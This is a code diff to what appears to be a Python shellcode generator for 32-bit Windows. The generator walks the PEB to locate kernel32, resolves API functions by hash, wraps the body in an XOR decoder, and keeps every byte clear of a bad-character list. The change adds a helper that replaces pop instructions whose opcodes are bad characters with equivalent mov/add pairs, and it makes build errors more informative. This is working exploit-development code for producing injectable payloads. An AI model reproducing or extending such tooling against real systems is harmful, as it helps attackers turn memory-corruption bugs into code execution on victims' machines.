@@ -12,8 +12,8 @@ and line, writes shellcode.bin and prints the bytes as a Python literal.
 Exit code 1 means a check failed.
 
 Nothing is chosen without being checked against BADCHARS: the registers the PEB walk
-and the resolver run on, the form of every constant and string push, and the stack
-cleanup after a cdecl call.
+and the resolver run on, the form of every constant and string push, the form of every
+pop, and the stack cleanup after a cdecl call.
 """
 import collections
 import itertools
@@ -424,6 +424,25 @@ def drop_args(count, note):
     return noted(form, note)
 
 
+def pop_reg(reg, note=""):
+    """`pop reg`, or the pair that does the same when its one-byte opcode is a bad char.
+
+    mov reg, dword ptr [esp] then add esp, 4 leaves the same value in reg and the same esp,
+    which is all a pop here is for. The one-byte form is shorter, so it wins whenever it is
+    clean. ESI holds the cursor lodsb reads and so is not a register choose_roles permutes,
+    which leaves the pair as the only way past a bad 5e.
+    """
+    opcode = enc(f"pop {reg}")[0]
+    forms = [[Op(f"pop {reg}", note)],
+             [Op(f"mov {reg}, dword ptr [esp]", note),
+              Op("add esp, 0x04", f"with the mov above this is pop {reg}, whose 0x{opcode:02x} opcode is a bad char")]]
+    form = shortest_clean(forms)
+    if form is None:
+        raise BuildError(f"no clean way to pop {reg}: its 0x{opcode:02x} opcode is a bad char, and so is "
+                         f"a byte of mov {reg}, dword ptr [esp] / add esp, 0x04")
+    return form
+
+
 def push_dword_of_text(value, note):
     """A string dword: push it as is, else XOR with a clean key, else the shortest other form.
 
@@ -541,7 +560,7 @@ def resolver(frame, roles):
         comment("Store the resolver address: a backward call pushes it without 00 bytes in the rel32."),
         Op("jmp res_call"),
         Op("res_pop:"),
-        Op("pop esi", "esi = resolve_hash"),
+        *pop_reg("esi", "esi = resolve_hash"),
         Op(f"mov {frame.slot('resolver')}, esi", "resolver"),
         Op("jmp main"),
         Op("res_call:"),
@@ -591,11 +610,11 @@ def resolver(frame, roles):
         Op("rh_out:"),
         Op(f"mov {roles.hash}, dword ptr [esp+0x14]", "return address"),
         Op(f"mov dword ptr [esp+0x1c], {roles.hash}", "over the hash slot, so one add drops both arguments"),
-        Op("pop edi"),
-        Op("pop esi"),
-        Op("pop edx"),
-        Op("pop ecx"),
-        Op("pop ebx"),
+        *pop_reg("edi"),
+        *pop_reg("esi"),
+        *pop_reg("edx"),
+        *pop_reg("ecx"),
+        *pop_reg("ebx"),
         Op("add esp, 0x08", "ret 8 would encode a 00 byte"),
         Op("ret"),
         Op("main:"),
@@ -608,18 +627,20 @@ def choose_roles():
     With the encoder on, the body never runs as written, so fewest wins and the build goes on.
     With it off, nothing can hide a bad byte there and a tie at zero is the only acceptable one.
     """
-    ranked = []
+    ranked, failure = [], None
     for roles in role_assignments():
         frame = Frame()
         frame.slot("resolver")
         try:
             placed = place(find_kernel32(frame, roles) + resolver(frame, roles))
-        except BuildError:
+        except BuildError as error:
+            failure = failure or error
             continue
         hits = sum(1 for _, _, encoding in placed for byte in encoding if byte in BAD)
         ranked.append((hits, sum(len(encoding) for _, _, encoding in placed), roles))
     if not ranked:
-        raise BuildError("neither the PEB walk nor the resolver assembles; keystone may be broken")
+        raise BuildError(f"neither the PEB walk nor the resolver builds under any register assignment: {failure}"
+                         if failure else "neither the PEB walk nor the resolver assembles; keystone may be broken")
     hits, _, roles = min(ranked, key=lambda row: row[:2])
     if hits and not XOR_ENCODER:
         raise BuildError("no register assignment keeps the PEB walk and the resolver clear of "
@@ -820,7 +841,7 @@ def xor_stub(code):
             ops = [comment("XOR decoder: get the body address with a backward call, decode in place, ret into it."),
                    Op("jmp dec_call"),
                    Op("dec_pop:"),
-                   Op("pop esi", "esi = encoded body"),
+                   *pop_reg("esi", "esi = encoded body"),
                    Op("push esi", "the ret below jumps to the decoded body")]
             ops += load_const(len(code), "ecx", f"ecx = {len(code)} bytes to decode")
             ops += [Op("dec_loop:"),
